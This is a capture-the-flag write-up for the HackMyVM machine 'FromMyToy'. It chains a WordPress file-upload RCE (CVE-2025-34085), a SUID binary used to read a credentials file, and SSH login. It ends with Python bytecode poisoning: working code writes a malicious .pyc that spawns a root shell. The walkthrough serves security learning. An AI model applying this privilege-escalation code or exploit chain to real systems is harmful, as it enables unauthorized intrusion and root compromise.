#  [FromMyToy](https://hackmyvm.eu/machines/machine.php?vm=Fromytoy) - HackMyVM Writeup

## 📌 Target Information

-   **IP:** 10.60.60.13
-   **Hostname:** fromytoy.hmv
-   **Attack Path:** WordPress RCE → Docker foothold → SUID abuse →
    Credential discovery → SSH user → Python module hijack → Root

------------------------------------------------------------------------

# 🔎 1. Enumeration

## 🔍 Nmap Scan

    nmap --privileged -v -p- -sC -sV -T4 10.60.60.13

### Open Ports

  Port   Service   Version
  ------ --------- -------------------------------
  22     SSH       OpenSSH 8.4p1 Debian
  80     HTTP      Apache 2.4.62
  3000   HTTP      Apache 2.4.51 (WordPress 6.9)

WordPress detected on port 3000.

------------------------------------------------------------------------

# 🧨 2. WordPress Enumeration

Using WPScan:

    wpscan --url http://10.60.60.13:3000 --enumerate vp

### Vulnerability Found

**Simple File List \< 4.2.3 -- Unauthenticated Arbitrary File Upload
RCE**\
CVE-2025-34085

This allows unauthenticated file upload leading to remote command
execution.

------------------------------------------------------------------------

# 💥 3. Initial Access -- RCE

Exploit used:

    python3 CVE-2025-34085.py -u http://fromytoy.hmv:3000 --cmd 'id'

Shell gained as:

    uid=33(www-data) gid=33(www-data)

Inside Docker container.

------------------------------------------------------------------------

# 🐳 4. Container Enumeration

Confirmed container environment:

    mount
    grep CapEff /proc/self/status

No effective capabilities available.

------------------------------------------------------------------------

# 🔎 5. Privilege Enumeration (www-data)

Discovered SUID binary:

    /usr/local/lib/.sys_log_rotator

Behavior: reverses input (like `rev`).

------------------------------------------------------------------------

# 🧾 6. Sensitive File Discovery

Found file owned by miku:

    /var/www/html/wp-content/uploads/server_backup_info.txt

Readable using double reverse trick:

    /usr/local/lib/.sys_log_rotator file | /usr/local/lib/.sys_log_rotator

Recovered credentials:

    User: miku
    Password: V0cal0id_M1ku_39

------------------------------------------------------------------------

# 🔐 7. SSH Access

    ssh miku@10.60.60.13

User flag:

    26d1ebd4ec8c55cc69f190d0d37f6dac

------------------------------------------------------------------------

# 🧠 8. Privilege Escalation

Sudo permissions:

    (ALL) NOPASSWD: /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py

Script imports:

    system_utils

Directory structure:

    /usr/local/lib/python_scripts/
    ├── cleanup_task.py
    ├── system_utils.py
    └── __pycache__/ (world writable)

------------------------------------------------------------------------

# 🧨 9. Python Bytecode Poisoning

Deleted root-owned .pyc (directory writable):

    rm /usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc


Generated malicious timestamp-based .pyc matching source header.

```zsh
python3 - <<'PY'
import os
import importlib._bootstrap_external as be

src = "/usr/local/lib/python_scripts/system_utils.py"
pyc = "/usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc"

payload = (
    "import os\n"
    "os.system('/bin/bash -p')\n"
    "def check_disk_space():\n"
    "    os.system('/bin/bash -p')\n"
)

code = compile(payload, src, "exec")
st = os.stat(src)
data = be._code_to_timestamp_pyc(code, int(st.st_mtime), st.st_size)

with open(pyc, "wb") as f:
    f.write(data)

print("[+] wrote malicious pyc:", pyc)
PY
```

Triggered root shell:

    sudo /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py

Verified:

    uid=0(root)

Root flag:

    a6c7cf996c275fa5afe6e47bc6f5c79e

Root flag obtained.

------------------------------------------------------------------------

# 🎯 Exploitation Chain Summary

1.  WordPress plugin RCE (CVE-2025-34085)
2.  Docker foothold as www-data
3.  SUID abuse to read credentials
4.  SSH login as miku
5.  Python __pycache__ poisoning (timestamp-based bytecode injection)
6.  Root shell

------------------------------------------------------------------------

# 🧠 Key Lessons

-   World-writable **pycache** directories are dangerous.
-   Deleting root-owned files is possible if directory lacks sticky bit.
-   Timestamp-based Python bytecode validation can be abused.
-   Container footholds can pivot to host-level compromise.

------------------------------------------------------------------------

**Machine: [FromMyToy](https://hackmyvm.eu/machines/machine.php?vm=Fromytoy) - HackMyVM**
